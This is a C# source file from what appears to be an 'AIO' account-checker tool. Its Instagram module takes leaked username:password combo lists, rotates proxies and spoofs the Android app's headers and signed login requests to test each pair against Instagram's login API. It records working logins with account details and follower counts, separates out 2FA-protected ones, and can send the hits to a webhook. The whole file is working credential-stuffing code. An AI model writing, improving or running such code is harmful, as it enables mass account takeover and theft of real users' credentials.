using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using BoltCUI;
using Leaf.xNet;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace Bolt_AIO
{
    internal class Instagrammod
    {
        private static readonly Random random = new Random();

        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var cookies = new CookieStorage();

                            var token = InstagramGetCSRF(ref cookies);

                            req.Cookies = cookies;
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.UserAgent =
                                "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("Cookie2", "$Version=1");
                            req.AddHeader("Accept-Language", "en-US");
                            req.AddHeader("X-IG-Capabilities", "3boBAA==");
                            req.AddHeader("X-IG-Connection-Type", "WIFI");
                            req.AddHeader("X-IG-Connection-Speed", "-1kbps");
                            req.AddHeader("X-IG-App-ID", "567067343352427");
                            req.AddHeader("rur", "ATN");

                            var guid = (GetRandomHexNumber(8) + "-" + GetRandomHexNumber(4) + "-4" +
                                        GetRandomHexNumber(3) + "-8" + GetRandomHexNumber(3) + "-" +
                                        GetRandomHexNumber(12)).ToLower();

                            var android_id = "android-" + GetRandomHexNumber(16);

                            var jsonData = HttpUtility.UrlEncode("{\"_csrftoken\":\"" + token + "\",\"adid\":\"" +
                                                                 guid +
                                                                 "\",\"country_codes\":\"[{\\\"country_code\\\":\\\"1\\\",\\\"source\\\":[\\\"default\\\"]}]\",\"device_id\":\"" +
                                                                 android_id +
                                                                 "\",\"google_tokens\":\"[]\",\"guid\":\"" + guid +
                                                                 "\",\"login_attempt_count\":0,\"password\":\"" +
                                                                 array[1] + "\",\"phone_id\":\"" + guid +
                                                                 "\",\"username\":\"" + array[0] + "\"}");

                            var strResponse = req.Post(new Uri("https://i.instagram.com/api/v1/accounts/login/"),
                                new BytesContent(Encoding.Default.GetBytes(
                                    "signed_body=9387a4ccde8c044515539b8249da655d63a73093eaf7c4b45fad126aa961e45b." +
                                    jsonData + "&ig_sig_key_version=4"))).ToString();

                            if (strResponse.Contains("logged_in_user"))
                            {
                                var is_verified = Regex.Match(strResponse, "is_verified\": (.*?),").Groups[1].Value;
                                var is_business = Regex.Match(strResponse, "is_business\": (.*?),").Groups[1].Value;
                                var is_private = Regex.Match(strResponse, "is_private\": (.*?),").Groups[1].Value;
                                var username = Regex.Match(strResponse, "\"username\": \"(.*?)\"").Groups[1].Value;

                                var otherCapture = "";
                                otherCapture = InstagramGetCaptures(cookies, username);

                                if (otherCapture == "")
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Instagram",
                                            array[0] + ":" + array[1] + " | " +
                                            $"Username: {username} - Verified: {is_verified} - Business: {is_business} - Private: {is_private}");
                                    Export.AsResult("/Instagram_hits",
                                        array[0] + ":" + array[1] + " | " +
                                        $"Username: {username} - Verified: {is_verified} - Business: {is_business} - Private: {is_private}");
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Instagram Hits");
                                }

                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Instagram_hits",
                                    array[0] + ":" + array[1] + " | " +
                                    $"Username: {username} - Verified: {is_verified} - Business: {is_business} - Private: {is_private}{otherCapture}");
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("Instagram",
                                        array[0] + ":" + array[1] + " | " +
                                        $"Username: {username} - Verified: {is_verified} - Business: {is_business} - Private: {is_private}");
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "Instagram Hits");
                            }
                            else if (strResponse.Contains("challenge_required") ||
                                     strResponse.Contains("\"two_factor_required\": true,"))
                            {
                                Program.Frees++;
                                Program.TotalChecks++;
                                if (Program.lorc == "LOG") Settings.PrintFree("Instagram", array[0] + ":" + array[1]);
                                Export.AsResult("/Instagram_frees", array[0] + ":" + array[1] + " | 2fa");
                            }
                            else if (strResponse.Contains(
                                         "\"The password you entered is incorrect. Please try again.\"") ||
                                     strResponse.Contains(
                                         "\"The username you entered doesn't appear to belong to an account. Please check your username and try again.\",") ||
                                     strResponse.Contains("\"Invalid Parameters\","))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }

        private static string InstagramGetCSRF(ref CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.IgnoreProtocolErrors = true;
                        req.AllowAutoRedirect = false;

                        cookies = new CookieStorage();
                        req.Cookies = cookies;
                        req.UserAgent =
                            "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";

                        var strResponse = req.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();

                        return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string InstagramGetCaptures(CookieStorage cookies, string username)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.IgnoreProtocolErrors = true;
                        req.AllowAutoRedirect = false;

                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");

                        var strResponse = req.Get(new Uri($"https://www.instagram.com/{username}/")).ToString();

                        if (strResponse.Contains("\"edge_followed_by\":{\"count\":"))
                        {
                            var follower_count = Regex.Match(strResponse, "\"edge_followed_by\":{\"count\":(.*?)}")
                                .Groups[1].Value;
                            var following_count = Regex.Match(strResponse, ",\"edge_follow\":{\"count\":(.*?)}")
                                .Groups[1].Value;

                            return $" - Followers: {follower_count} - Following: {following_count}";
                        }

                        return "";
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        public static string GetRandomHexNumber(int digits)
        {
            var buffer = new byte[digits / 2];
            random.NextBytes(buffer);
            var result = string.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
            if (digits % 2 == 0)
                return result;
            return result + random.Next(16).ToString("X");
        }
    }
}